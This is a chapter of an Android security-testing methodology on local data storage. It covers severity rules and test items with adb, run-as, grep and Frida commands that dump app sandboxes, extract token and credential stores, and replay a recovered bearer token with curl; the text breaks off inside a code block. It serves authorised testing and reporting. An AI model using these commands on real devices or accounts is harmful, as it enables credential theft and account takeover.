# D11 · Local Data Storage

> Everything the app writes to disk: SharedPreferences, SQLite/Room, DataStore, MMKV, Realm, Couchbase
> Lite, files, caches, external and shared storage, the backup set, the clipboard, the keyboard cache and
> the process heap. Stated bluntly: **storage alone is P5.** Bugcrowd prices
> `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` at P5 with the
> baseline vector `AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`, and Xiaomi, Grab and Spotify list app-private
> storage as explicitly out of scope. This chapter exists to produce the **payload** for a reach primitive
> that lives in another domain, and to find the two storage sub-classes that escape P5 on their own:
> shared storage (P4) and backup/device-transfer **restore** (a write primitive, not a read one).

| | |
|---|---|
| **Phases** | P4 static deep review, P5 on-device dynamic & data-at-rest |
| **Milestones** | M4, M5 |
| **VRT ceiling** | Inside the storage branch, **P4** — `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (CWE-312). The honest ceiling is reached by **leaving the branch**: a restored backup that authenticates on an attacker device files as `broken_authentication_and_session_management.authentication_bypass` (**P1**); a server-side credential recovered from a local store files as `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) or `...for_internal_asset` (P3); a hardcoded DB passphrase files as `insecure_os_firmware.hardcoded_password.non_privileged_user` (**P2**) and, if reused across environments, `cryptographic_weakness.key_reuse.inter_environment` (**P2**). Never file a storage payload under `insecure_data_storage.*` when a reach primitive exists — file the reach. |
| **Primary attacker model** | **AM-03** zero-permission local app (shared storage, MediaStore, world-readable legacy files). **AM-04** where a routinely granted `READ_MEDIA_*` is needed. **AM-11** physical unlocked, for the backup/device-transfer restore chain. **AM-05** another user of the same app, for shared-device and account-switch residue. **AM-12 own rooted device is not an attack** and is the single most common reason a D11 report closes as informational. |
| **Maps to** | MASVS-STORAGE-1, MASVS-STORAGE-2, MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-CODE · MASTG-TEST-0009, MASTG-TEST-0200, MASTG-TEST-0201, MASTG-TEST-0202, MASTG-TEST-0203, MASTG-TEST-0207, MASTG-TEST-0216, MASTG-TEST-0231, MASTG-TEST-0258, MASTG-TEST-0262, MASTG-TEST-0287, MASTG-TEST-0304, MASTG-TEST-0305, MASTG-TEST-0306, MASTG-TEST-0316, MASTG-TEST-0011 (deprecated), MASTG-TEST-0006 (deprecated) · MASTG-TECH-0002, MASTG-TECH-0008, MASTG-TECH-0043, MASTG-TECH-0044, MASTG-TECH-0127, MASTG-TECH-0128, MASTG-TECH-0142 · MASTG-KNOW-0036, MASTG-KNOW-0037, MASTG-KNOW-0038, MASTG-KNOW-0039, MASTG-KNOW-0040, MASTG-KNOW-0041, MASTG-KNOW-0042, MASTG-KNOW-0050, MASTG-KNOW-0051, MASTG-KNOW-0055, MASTG-KNOW-0142 · MASTG-TOOL-0029, MASTG-TOOL-0106, MASTG-TOOL-0036, MASTG-TOOL-0129, MASTG-TOOL-0144 · MASTG-BEST-0004, MASTG-BEST-0019, MASTG-BEST-0050 · MASTG-DEMO-0002 · MASWE-0001, MASWE-0002, MASWE-0005, MASWE-0006, MASWE-0024, MASWE-0030, MASWE-0036, MASWE-0038, MASWE-0040, MASWE-0050, MASWE-0061 · CWE-200, CWE-256, CWE-259, CWE-276, CWE-284, CWE-312, CWE-313, CWE-321, CWE-359, CWE-459, CWE-524, CWE-532, CWE-668, CWE-729, CWE-732, CWE-919, CWE-921, CWE-922 · T1409, T1420, T1533, T1532, T1635, T1638, T1628.003, T1513, T1417.001, M1006, AN1840 |

## Why this domain pays

Mostly, it does not. The base rate of *defects* here is close to 100% — every app stores something in
cleartext — and the base rate of *payable findings* is close to zero, because the entire internal-storage
branch of the VRT is pinned at P5 and several major programmes exclude it by name. Google's Mobile VRP is
explicit that access to non-sensitive internal files of another app does not qualify. GitHub Security Lab's
$4,500 payout (H1 #1122661, CWE-312) is routinely miscited as precedent for reporting cleartext
SharedPreferences; it was a **CodeQL detection query** contributed upstream, not a report that one app stored
a token in plaintext. H1 #1225158 (Zivver), "ADB Backup is enabled within AndroidManifest", paid **$0**. If
your D11 output is a list of files containing tokens, you have produced an inventory, not findings.

Three things in this chapter escape that. **First, shared storage.** The VRT rates
`...on_external_storage` a full band higher at P4 precisely because no root is required, and the word
"external" in your title is worth a priority band. **Second, the write direction.** Backup/device-transfer
restore, MediaStore inserts with attacker-chosen `RELATIVE_PATH`, symlink races on shared directories,
hot-journal and `.bak` ghost files: these are all *writes into the victim's sandbox*, and a write that lands
on a config the app trusts or a path ART will execute is Critical, not P5. The single highest-value
inversion in this domain is to stop asking "is my token backed up" and start asking "what security-relevant
value in the backup set does the app **trust on next launch**" — an API base URL, a certificate-pin set, a
feature flag, an `is_rooted` cache, a biometric-lock boolean. Restoring an attacker-authored copy of any of
those reconfigures the app before it ever contacts the server, and restore happens after APK installation
but **before the user can launch the app**. **Third, the shared device.** The AOSP security-model paper's
threat [T.P4] — "screen unlocked (shared) devices under control of an authorized but different user" — is a
supported scenario for kiosks, POS terminals, hospital ward tablets and family devices, and nobody tests what
logout leaves on disk.

The discipline that makes the rest of the chapter worth running is that every storage observation is half a
finding. The other half is a named unprivileged reader. Write that sentence first — *which actor reads this
file, and with what* — and the rating follows mechanically: a zero-permission app reading it is High; an
unlocked-device attacker is Medium; only root reaches it, and it is Low or informational.

## The crux question

**For each sensitive value the app persists: which principal other than the app's own UID can read it, or
write it, without root — and if the answer is "none", is there any value in the backup set that the app
trusts on next launch?**

## Triage order

1. **`adb shell run-as $PKG id`.** One command decides whether the whole chapter needs root. If it works on
   a release build you also have a D02 finding, and every item below becomes a non-root PoC.
2. **Post-login sweep by file EXTENSION across the whole data dir** (D11-004). `databases/` plus
   `shared_prefs/` misses Couchbase `.cblite`, Realm, MMKV and DataStore `.preferences_pb`, all of which
   live in `files/`. Ten minutes, and it tells you what the rest of the day is about.
3. **Read the backup rules file, then exercise the D2D transport** (D11-051, D11-052). The asymmetry
   between `<cloud-backup>` and `<device-transfer>` is the least-tested configuration in Android, and a
   missing section means that mode is *fully enabled*.
4. **Grep the control-plane keys against the backup set** (D11-056). This is the item with the highest
   ceiling in the chapter and it takes one grep plus one `cat`.
5. **`getWritableDatabase("` with any string argument** (D11-023). The framework overload takes no
   argument, so an argument is SQLCipher and a literal there is the whole finding, mechanically.
6. **External / shared storage diff** (D11-041). The only storage class the VRT rates above P5 on its own.
7. **The write direction: MediaStore `RELATIVE_PATH`, symlink races, zip-slip, `Content-Disposition`**
   (D11-045 to D11-049). Slower to set up, and the only route from this chapter to Critical.
8. **Logout / account-switch / uninstall residue** (D11-033 to D11-035). Cheap, and it is the one class
   that produces a cross-user finding on a device the vendor explicitly supports sharing.
9. **Clipboard, keyboard cache, recents snapshot** (D11-059 to D11-062). All P5 by VRT. Run them for
   completeness and for the chain, never as headline findings.
10. **Memory** (D11-066, D11-067). Requires instrumentation, so it is a contributing factor that raises
    another finding's impact, not a headline of its own.

## Items

### D11-001 · The reachability rule — name the unprivileged reader before writing the word "storage"

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) — this item exists to get you **out** of that node |
| **Attacker** | AM-03 / AM-04 / AM-11; explicitly **not** AM-12 |
| **Applies to** | all — this is the gate for every other item in the chapter |
| **Maps to** | VRT baseline vector `AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`; CWE-312; MASWE-0001 |

- **Test:** Before writing anything, answer in one sentence: *which actor, holding what, reads this file?*
  The VRT encodes the answer in its tree — internal storage P5, external storage P4 — and neither is payable
  without a demonstrated reader. `AV:P` (physical) in the baseline vector is exactly the precondition you must
  remove.
- **How:**
```bash
# 1. what is there (internal)
adb shell run-as $PKG find /data/data/$PKG -type f | head -60
# 2. what is there (shared)
adb shell ls -laR /sdcard/Android/data/$PKG/ /sdcard/Download /sdcard/Android/media/$PKG 2>/dev/null
# 3. THE STEP THAT DECIDES THE RATING — read the same path from a zero-permission PoC app
#    (not from `adb shell`: shell is uid 2000 and holds permissions no third-party app has)
adb install poc-reader.apk && adb shell am start -n com.poc.reader/.MainActivity \
  --es path /sdcard/Android/data/$PKG/files/session.json
adb logcat -s POC:E -d
```
- **Proof:** Either (a) the PoC app's own logcat tag printing the file contents, or (b) a named reach
  primitive you also demonstrate — `run-as` on a shipped debuggable build (D02), a `bmgr` backup extraction,
  an exported provider read (D07), a FileProvider traversal (D07), a `file://` WebView read (D10), or a
  world-readable mode bit. Without one of those the finding is P5 and closes.
- **Escalation:** The reach primitive is the report; the storage is its payload. -> D07 providers, -> D08 URI
  grants, -> D10 WebView file read, -> D02 debuggable.
- **Ruled out when:** Every sensitive file sits under `/data/data/$PKG` with mode `0600`, the app's home
  directory is `0700` (`targetSdkVersion >= 24`), a zero-permission PoC app receives `Permission denied` on
  every path, `allowBackup` is effectively false or the rules exclude those paths, and no provider, WebView
  or debuggable path reaches them. Record the PoC app's `Permission denied` output — that is the defensible
  negative, not the absence of a scanner hit.

### D11-002 · Build the read-primitive inventory before the storage sweep, not after

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0008; AOSP "Application Sandbox" (UID + per-app SELinux categories) |

- **Test:** Enumerate every way a non-root principal reaches `/data/data/$PKG` on this target, and record a
  yes/no for each. The list is finite: `run-as` (debuggable), same-`sharedUserId` sibling package, backup
  (`bmgr` / `adb backup` / D2D), an exported or grantable ContentProvider, a WebView with
  `setAllowFileAccess`, a file descriptor handed over binder, and a world-readable mode bit from a legacy
  write. Knowing which are open decides which storage items are worth a day.
- **How:**
```bash
adb shell run-as $PKG id                                     # debuggable?
grep -n 'sharedUserId' out/AndroidManifest.xml               # sibling UID?
adb shell pm list packages -U | grep " uid:$(adb shell dumpsys package $PKG | awk '/userId=/{print $1}' | head -1 | cut -d= -f2)"
grep -nE 'allowBackup|fullBackupContent|dataExtractionRules' out/AndroidManifest.xml
adb shell dumpsys package $PKG | sed -n '/Provider Resolver Table/,/Key Set Manager/p'
grep -rnE 'setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs' out/sources/
adb shell run-as $PKG find . -type f ! -perm 600 -exec ls -l {} \;
```
- **Proof:** A seven-row table with a yes/no and the evidence command for each primitive, pasted into the
  report's preconditions section.
- **Escalation:** Each "yes" row is itself a finding in its own domain (D02, D03, D07, D10) and should be
  filed there — see D11-070 on chain-filing order.
- **Ruled out when:** Every row is "no" **and** you have re-tested the provider row from a PoC app that
  declares `<queries>` (a caller targeting SDK 30+ cannot see an undeclared package, and that failure looks
  identical to a closed provider). A blank table with no PoC app is not a negative.

### D11-003 · `run-as` — the fastest private-storage read primitive that exists

| | |
|---|---|
| **Severity ceiling** | High (as a D02 finding on a shipped debuggable build); Support otherwise |
| **VRT** | n/a here; the debuggable flag itself is filed in D02 |
| **Attacker** | AM-11 physical unlocked with ADB authorised; AM-03 if a shell-broker app is present |
| **Applies to** | `android:debuggable="true"` builds, and all packages on `userdebug`/`eng` images |
| **Maps to** | MASTG-TECH-0008; AOSP `run-as` semantics |

- **Test:** One command tells you whether root is needed for the whole chapter. On a shipped debuggable
  release it is simultaneously a D02 High and the non-root retrieval path that lifts every storage payload
  in this chapter out of P5.
- **How:**
```bash
adb shell run-as $PKG id
adb shell run-as $PKG ls -R /data/data/$PKG
adb shell run-as $PKG cat /data/data/$PKG/shared_prefs/*.xml
adb exec-out run-as $PKG cat databases/app.db > app.db          # exfil without root
# whole-tree copy (adb pull will not traverse run-as; do it file by file)
dir="/data/data/$PKG"; IFS=$'\n'
for d in $(adb shell run-as $PKG find "$dir" -type d); do mkdir -p ".$d"; done
for f in $(adb shell run-as $PKG find "$dir" -type f); do adb exec-out run-as $PKG cat "$f" > ".$f"; done
```
- **Proof:** Content returned where a plain `adb shell cat` on the same path returns `Permission denied`.
  Show both commands side by side — that contrast is what proves the boundary and the bypass.
- **Escalation:** -> D02 (`debuggable` on a release build), -> D26 (JDWP attach gives code execution in the
  app's UID, which reaches everything in D12 and D13 as well).
- **Ruled out when:** `run-as` returns `package not debuggable` on a build whose signature matches the Play
  Store artefact, verified with `aapt dump badging` and an `apksigner verify --print-certs` comparison. A
  `run-as` failure on your own rebuilt/patched APK proves nothing about the shipped build.

### D11-004 · Sweep by file EXTENSION across the whole data dir, never by directory

| | |
|---|---|
| **Severity ceiling** | Support (the finding is whatever the sweep recovers) |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-03 once paired with a reader |
| **Applies to** | all; mandatory on any app using Couchbase Lite, Realm, MMKV or DataStore |
| **Maps to** | MASTG-TECH-0008; MASTG-KNOW-0040 (Realm), MASTG-KNOW-0142 (Android DataStore) |

- **Test:** `databases/` and `shared_prefs/` are two of roughly a dozen places a modern app writes. Couchbase
  Lite `.cblite` files sit in `files/` and their contents are **plain JSON**; Realm, MMKV and DataStore
  `.preferences_pb` are also in `files/`. Sweeping by directory produces a clean-looking false negative.
- **How:** Run it *after a real login and a real transaction*, not on a fresh install:
```bash
#!/bin/bash   # astore.sh <pkg>
P=/data/data/$1
adb shell "find $P -type f" | wc -l
adb shell "grep -rlaE 'eyJ[A-Za-z0-9_-]{10,}|Bearer |access_token|refresh_token|api[_-]?key' $P 2>/dev/null"
adb shell "find $P \( -name '*.db' -o -name '*.cblite*' -o -name '*.realm' -o -name '*.preferences_pb' \
  -o -name '*.mmkv' -o -name '*.sqlite*' -o -name '*.json' -o -name '*.xml' \) 2>/dev/null"
# non-root / debuggable equivalent
adb shell run-as $1 find /data/data/$1 -type f
# once pulled:
find pulled/ \( -iname '*.cblite*' -o -iname '*.realm' -o -iname '*.db' -o -iname '*.sqlite*' \
  -o -iname '*.xml' -o -iname '*.json' -o -iname '*.mmkv' -o -iname '*.preferences_pb' \) -print
strings pulled/files/*.cblite | grep -iE 'pass|token|card|cvv|secret|auth|bearer|eyJ'
```
- **Proof:** Credential material recovered by `strings` + `grep` with **no database client at all**, with the
  full path of each file. A `.cblite` hit is the clearest demonstration in the chapter that "we use an
  embedded database" is not encryption.
- **Escalation:** Feeds every store-specific item below; the recovered token goes to D13 (what does it
  unlock?) then D15 (replay it).
- **Ruled out when:** The `find` returns no file outside `cache/`, `code_cache/` and `no_backup/` whose
  contents match the credential regexes **after** an authenticated session and a state-changing action —
  and you have confirmed the write path exists at all (D11-006) rather than concluding from an empty sweep
  on a fresh install.

### D11-005 · Differential sandbox dump with 8+ character markers, baseline-searched first

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler) |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0207, MASTG-TECH-0008, MASTG-TECH-0002, MASWE-0001, MASTG-KNOW-0041, MASTG-BEST-0050 |

- **Test:** Snapshot the data directory, exercise every sensitive flow typing **unique random markers**, snapshot
  again, diff, then hunt the markers *and their encodings*. The diff is what attributes a file to a specific
  user action, which is what makes the write-up defensible. Marker discipline is not optional: the marker
  must be 8+ random alphanumeric characters with no English word and no protocol keyword, and you must
  **search the BEFORE snapshot for the marker before claiming a hit** — a word collision in a churning
  binary cache is the commonest false positive in this domain.
- **How:**
```bash
M=x4hd2k9pq7                                            # never: test, marker, password, AAAA
adb shell run-as $PKG tar -cf - . > before.tar          # or, rooted: adb pull /data/data/$PKG ./before/
# ... log in, save a card, send a message, all using $M as the value ...
adb shell run-as $PKG tar -cf - . > after.tar
mkdir b a && tar xf before.tar -C b && tar xf after.tar -C a
grep -rl "$M" b/ && echo "BASELINE CONTAINS THE MARKER -- pick a new one, this hit is worthless"
diff -rq b a | tee changed.txt
grep -rl --binary-files=text "$M" a/
grep -rl "$(printf "$M" | base64)" a/
grep -rl "$(printf "$M" | xxd -p)" a/
grep -rl "$(printf "$M" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')" a/
```
  MASTG-TEST-0207's evaluation note is worth following literally: decode base64, hex, URL-encoding, escape
  sequences, wide characters and simple XOR, and decompress archives — "these methods obscure but do not
  protect sensitive data", so a base64'd token is still a cleartext finding.
- **Proof:** The marker, or a decodable transformation of it, present in a named file under `shared_prefs/`,
  `databases/`, `files/` or `cache/`, **and absent from the baseline**. Quote the file path and the key name.
- **Escalation:** The recovered key names become the probes for D11-004's sweep and for the backup-rules
  review (D11-051).
- **Ruled out when:** The diff shows the store changing and the marker is present in **neither** cleartext
  nor any of the listed encodings, and a `Cipher.doFinal` hook (D11-011) shows the value passing through
  encryption before the write. "Grep found nothing" without the encoding pass is not a negative.

### D11-006 · Confirm a WRITE PATH before claiming anything is persisted

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (accuracy gate) |
| **Attacker** | n/a |
| **Applies to** | all; critical on R8-minified builds |
| **Maps to** | MASTG-TEST-0287 (the `putString` hook is the write-path evidence) |

- **Test:** A field in a model class proves nothing about storage. R8 keeps Gson-annotated dead fields, and
  a payment model can declare `_all_digits`, `_cvv` and `_isCardSavedOnlyLocally` where all three are
  vestigial — no getters, and the flag only ever copied object-to-object, never gating a write. For each
  suspicious field find a `putString`/`toJson`/`insert`/file-write that actually carries it.
- **How:**
```bash
grep -rn 'edit()\.put\|putString(\|putBoolean(\|putInt(' out/sources/ | grep -iE 'token|auth|session|card|cvv|pin'
grep -rn 'openFileOutput(\|FileOutputStream(\|\.writeText(\|Files\.write(' out/sources/
grep -rn 'insert(\|Room\.databaseBuilder\|@Entity' out/sources/ | grep -iE 'card|token|user'
```
```javascript
// runtime confirmation — hook the write, print a backtrace, and watch for a preceding Cipher
Java.perform(function () {
  var E = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
  E.putString.implementation = function (k, v) {
    console.log('[putString] ' + k + ' = ' + v);
    console.log(Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
    return this.putString(k, v);
  };
  var C = Java.use('javax.crypto.Cipher');
  C.doFinal.overload('[B').implementation = function (b) {
    console.log('[Cipher.doFinal] ' + this.getAlgorithm());
    return this.doFinal(b);
  };
});
```
- **Proof:** Either the write site with its backtrace, or the verified negative written out in full — e.g.
  "card data is never persisted locally: tokenise-and-discard, confirmed with a rooted dump taken after the
  saved-cards screen was loaded, and with a `putString` hook showing only the last four digits and the
  network token".
- **Escalation:** The verified negative is a deliverable (D27) and it is what makes the positive claims in
  the same report credible.
- **Ruled out when:** The field exists but no write site carries it and the runtime hook never fires during
  the flow that populates it. State both halves.

### D11-007 · Two storage-forensics regexes that silently return nothing

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (accuracy gate) |
| **Attacker** | n/a |
| **Applies to** | all R8-minified apps |
| **Maps to** | mechanism (observed in a real engagement; no external identifier) |

- **Test:** Two grep traps that produce clean-looking false negatives and have each caused a real "clean"
  verdict on a target that was not clean.
- **How:**
  1. **SharedPreferences integers and booleans are attributes, not element text.** `<int name="user_id"
     value="13688488" />` will never match a `name="k"[^>]*>([^<]*)<` pattern — the field renders empty and
     the extractor reports nothing.
  2. **Gson's `@SerializedName` survives R8 but its class is renamed**, typically to
     `com.google.gson.annotations.c`, so the decompiled source reads `@c("card_token")`. Grep the annotation
     **values**, not the annotation name.
```bash
# 1 — match both shapes
grep -oE '<(string|int|long|boolean|float) name="[^"]+"( value="[^"]*")?>?[^<]*' shared_prefs/*.xml
# 2 — R8-renamed annotations
grep -rnE '@[a-z]\("(card|token|cvv|pan|auth|session|refresh|pin)[a-z_]*"\)' out/sources/
```
- **Proof:** The corrected pattern returning hits where the naive one returned zero, shown as two greps
  side by side.
- **Escalation:** The recovered field names become the storage-sweep probes (D11-004) and the backup-rules
  keys (D11-051).
- **Ruled out when:** Both corrected patterns return nothing on a fully exercised, authenticated data
  directory. The naive pattern returning nothing is never the negative.

### D11-008 · Substring searches for short numeric secrets are noise, not evidence

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (accuracy gate) |
| **Attacker** | n/a |
| **Applies to** | all payment, wallet and identity engagements |
| **Maps to** | mechanism; feeds the D23 payment-data claim |

- **Test:** Grepping app storage for a card's last four digits flipped 0 -> 1 -> 0 across three runs of the
  same engagement, because a four-digit string occurs by chance across hundreds of churning binary cache
  files. Use probes that cannot fire randomly: **field names**, **Luhn-valid BIN-shaped 16-digit runs**, and
  database `strings` output.
- **How:**
```bash
strings -a pulled/**/* | grep -oE '\b[2-6][0-9]{15}\b' | sort -u | while read -r n; do
  python3 - "$n" <<'PY'
import sys
n = sys.argv[1]; d = [int(c) for c in n][::-1]
s = sum(d[0::2]) + sum(sum(divmod(x*2, 10)) for x in d[1::2])
print(n) if s % 10 == 0 else None
PY
done
grep -rnE '"(pan|card_number|cardNumber|cvv|cvc|expiry|exp_month)"' pulled/
```
- **Proof:** A Luhn-valid PAN-shaped hit or a field-name hit — never a bare four-digit coincidence. State in
  the report that bare four-digit matches were excluded and why; a triager who has seen that paragraph trusts
  the rest of the payment section.
- **Escalation:** -> D23 payment data; a stored PAN materially raises the data class and is one of the few
  ways a storage finding survives the P5 default.
- **Ruled out when:** The Luhn filter returns nothing and the field-name grep returns nothing across the
  full post-transaction dump. Record both, plus the count of raw four-digit matches you discarded.

### D11-009 · Before declaring a storage or crypto subsystem absent, find the SECOND implementation

| | |
|---|---|
| **Severity ceiling** | Support (it prevents a retracted High) |
| **VRT** | n/a (accuracy gate) |
| **Attacker** | n/a |
| **Applies to** | all; acute on React Native, Flutter and any DI-heavy app |
| **Maps to** | mechanism; the canonical retraction case in the local corpus |

- **Test:** The most instructive retraction in the corpus is a finding whose every `file:line` citation was
  **accurate** and which was still wrong, because a second, fully implemented module provided the capability
  and was the one the app actually used. Accurate citations do not make a finding correct. Before writing
  "the app does not use secure storage", enumerate every registered module and resolve the JS/native name
  mapping.
- **How:**
```bash
grep -rn 'createNativeModules\|ReactPackage\|getPackages\|@Provides\|@Binds\|@Module' out/sources/
grep -rniE 'keychain|securestore|EncryptedSharedPreferences|MasterKey|MMKV|AsyncStorage|preferences_pb' out/sources/
# read the generated PackageList / DI graph END TO END, then check what the JS layer actually calls
grep -rn 'NativeModules\.' assets/index.android.bundle | sort -u | head -40
```
- **Proof:** The worked case: a genuine stub module existed **while** `com.oblador.keychain.KeychainModule`
  (JS name `RNKeychainManager`) was also registered and was what the JS called. The JS-visible module name
  is not the Java class name — resolve that mapping before writing the sentence.
- **Escalation:** The same rule applies to user-facing text: never assert the app tells the user something
  without grepping `res/values/strings.xml` for it. One invented impact bullet discredits the whole report.
- **Ruled out when:** Every module list, DI graph and generated `PackageList` has been read end to end and
  the capability appears in none of them, **and** the JS/native call sites confirm it. A grep of the app's
  own source package only is not the negative.

### D11-010 · Shell-Loop Ban — count your results or the storage sweep lies to you

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (accuracy gate) |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | mechanism (false-positive discipline) |

- **Test:** Shell array loops and `for f in $(adb shell ...)` pipelines fail silently — a device path with a
  space, an `adb` reconnect, a `run-as` denial mid-loop, or a `find` returning nothing all yield an empty
  result set that reads exactly like "clean". Anything iterating more than five items goes in Python, and
  every sweep prints a count.
- **How:**
```bash
# always emit the denominator
N=$(adb shell run-as $PKG find /data/data/$PKG -type f | wc -l); echo "files scanned: $N"
[ "$N" -lt 5 ] && echo "SWEEP FAILED -- run-as denied or app never launched; do not record a negative"
```
```python
import subprocess, re
PKG = "com.target.app"
files = subprocess.run(["adb","shell","run-as",PKG,"find",f"/data/data/{PKG}","-type","f"],
                       capture_output=True, text=True).stdout.split()
print(f"files: {len(files)}")
pat = re.compile(rb"eyJ[A-Za-z0-9_-]{10,}|Bearer |refresh_token|access_token|api[_-]?key", re.I)
hits = 0
for f in files:
    data = subprocess.run(["adb","exec-out","run-as",PKG,"cat",f], capture_output=True).stdout
    if pat.search(data):
        hits += 1; print("HIT", f)
print(f"scanned {len(files)} files, {hits} hits")
```
- **Proof:** Every sweep result in the report carries its denominator ("scanned 412 files, 3 hits"), so a
  reader can tell a real negative from a broken loop.
- **Escalation:** This is what makes the ruled-out register in this chapter trustworthy.
- **Ruled out when:** n/a — this item is always run.

### D11-011 · Plaintext session/refresh token in SharedPreferences — rate it honestly

| | |
|---|---|
| **Severity ceiling** | Low standalone; High only with a demonstrated non-root reader |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `insecure_data_storage.server_side_credentials_storage.plaintext` (P4, CWE-256) when it is a password rather than a token |
| **Attacker** | AM-03 only via a reach primitive; AM-11 with ADB; **AM-12 is not an attack** |
| **Applies to** | all — **CURRENT** |
| **Maps to** | MASTG-TEST-0287, MASTG-KNOW-0036, MASWE-0001, CWE-312; H1 #44727 (Vine, $140), H1 #1142918 (Nextcloud, Medium) |

- **Test:** Establish three things and no more: (a) the write site, (b) the resolved filename, (c) the storage
  mode. Never claim "any app can read it" from a code read — `MODE_WORLD_*` throws from targetSdk 24 and
  SELinux confines `/data/data` per app regardless of DAC bits. MASTG's own framing is the honest one:
  `MODE_PRIVATE` "doesn't protect the data from being read by attackers who gain access to the device's file
  system (for example, through device compromise, backup extraction, or physical access to rooted/unlocked
  devices)" — so name the specific retrieval path.
- **How:**
```bash
grep -rn 'getSharedPreferences(\|getDefaultSharedPreferences(' out/sources/ -A3 | grep -iE 'token|auth|session|refresh|pin'
grep -rn 'edit()\.putString(' out/sources/ | grep -iE 'token|auth|session|refresh'
adb shell run-as $PKG sh -c 'for f in shared_prefs/*.xml; do echo "== $f"; cat "$f"; done'
adb shell run-as $PKG cat shared_prefs/auth.xml | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
# known token homes worth naming explicitly
adb shell run-as $PKG cat files/PersistedInstallation.json 2>/dev/null   # Firebase: auth_token/refresh_token/user_id
```
  Then replay:
```bash
curl -i -H "Authorization: Bearer <token>" https://api.target.tld/v1/me
```
- **Proof:** `getSharedPreferences(name, 0)` plus a `putString("access_token", ...)` write site plus the
  resolved filename plus the on-disk XML — **and** the `HTTP/1.1 200 OK` body containing the victim's account
  data produced from a host that is not the device. The replay is the finding; the file is the evidence.
- **Escalation:** -> D13 (is the token revoked on logout, password change, uninstall?), -> D15 (what does it
  reach, and is the mobile API an older, weaker version than the web app's — see D11-072), -> D07/D08/D10 for
  the reach primitive that removes `AV:P`.
- **Ruled out when:** Every credential write passes through `Cipher.doFinal` before the `putString` (confirm
  with the D11-006 hook), or the store is `EncryptedSharedPreferences` with a `MasterKey` (then go to
  D11-013), **and** no unprivileged reader exists per D11-001. A token that is device-bound and rejected when
  replayed from another host is a materially weaker finding — say so rather than omitting the replay.

### D11-012 · `EncryptedSharedPreferences` used for one store but not another

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) — argue up on the internal-inconsistency axis |
| **Attacker** | AM-03 with a reach primitive |
| **Applies to** | apps that ship `androidx.security.crypto` at all |
| **Maps to** | MASWE-0001; MASTG-KNOW-0036 |

- **Test:** The strongest version of the plaintext-prefs argument is not "you should encrypt" — it is "you
  already decided this data class needs encryption, and then wrote the same class in cleartext somewhere
  else". That is an internal inconsistency the vendor cannot dispute on threat-model grounds, because they
  set the threat model themselves.
- **How:**
```bash
grep -rn 'EncryptedSharedPreferences\|MasterKey\|EncryptedFile' out/sources/ -A6
# list every prefs file the app creates, then mark which are encrypted
grep -rnoE 'getSharedPreferences\("([^"]+)"' out/sources/ | sort -u
adb shell run-as $PKG ls -la shared_prefs/
# encrypted stores render as base64 blobs with obfuscated key names; plaintext ones do not
adb shell run-as $PKG head -5 shared_prefs/*.xml
```
- **Proof:** Two `ls`/`cat` outputs side by side: one prefs file whose keys and values are base64 blobs, and
  another, written by the same app in the same session, containing a readable `access_token`. Name both
  files and both write sites.
- **Escalation:** -> D12 for the master-key parameters; -> D11-056 if the cleartext store also holds a value
  the app trusts on next launch.
- **Ruled out when:** No `androidx.security.crypto` dependency is present anywhere in the merged app
  (`grep -rn 'androidx.security' out/` and the dependency list), so there is no inconsistency to argue —
  the finding is then plain D11-011 and carries D11-011's rating.

### D11-013 · `EncryptedSharedPreferences` present but the key is not user-authentication-bound

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High with a local read primitive |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) for the data; the key-management half belongs to D12 |
| **Attacker** | AM-11 physical unlocked; AM-03 only with in-process code execution |
| **Applies to** | apps using `androidx.security.crypto`, `flutter_secure_storage`, `react-native-keychain`, `react-native-encrypted-storage`, Capacitor secure-storage plugins |
| **Maps to** | MASWE-0001; `KeyGenParameterSpec.setUserAuthenticationRequired` |

- **Test:** "It uses Keystore" is not the finding. The finding is whether the Keystore key is (a) bound to
  user authentication and (b) reachable by any in-process primitive. If the key has no
  `setUserAuthenticationRequired`, anything running in the app's UID — Frida, a loaded DEX, a same-UID sibling
  — decrypts the store on a merely-unlocked device, which makes a "biometric-protected" or "secure storage"
  marketing claim false. Note also that Jetpack Security's `EncryptedSharedPreferences` is deprecated as of
  1.1.0 and Google advises against it for new apps; a modern app still relying on it is worth a line.
- **How:**
```bash
grep -rn 'EncryptedSharedPreferences\|MasterKey\|KeyGenParameterSpec' out/sources/ -A12 | \
  grep -nE 'setUserAuthenticationRequired|setUserAuthenticationValidityDurationSeconds|setInvalidatedByBiometricEnrollment|setUserAuthenticationParameters'
adb shell run-as $PKG cat shared_prefs/FlutterSecureStorage.xml 2>/dev/null   # base64-wrapped blobs
objection --gadget $PKG explore
> android keystore list
```
```javascript
// decrypt in place with the app's own alias — no key extraction required
